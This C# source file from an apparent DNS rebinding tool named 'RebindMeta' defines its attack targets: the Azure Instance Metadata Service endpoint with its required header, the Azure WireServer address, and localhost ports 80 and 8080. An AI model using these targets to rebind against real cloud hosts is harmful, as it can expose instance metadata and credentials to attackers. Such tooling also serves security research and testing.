using System.Collections.Generic;

namespace RebindMeta
{
	public static class AttackTargets
	{
		public static readonly AttackTarget AzureIMDS = new AttackTarget(80, new RebindTarget("169.254.169.254", "/metadata/instance?api-version=2020-06-01", AzureIMDSHeaders));
		public static readonly AttackTarget AzureWireserver = new AttackTarget(80, new RebindTarget("168.63.129.16",  "/?comp=versions"));
		public static readonly AttackTarget Localhost80 = new AttackTarget(80, new RebindTarget("127.0.0.1",  "/"));
		public static readonly AttackTarget Localhost8080 = new AttackTarget(8080, new RebindTarget("127.0.0.1",  "/"));

		private static readonly Dictionary<string, string> AzureIMDSHeaders = new Dictionary<string, string>
		{
			{ "metadata", "true" }
		};
	}
}
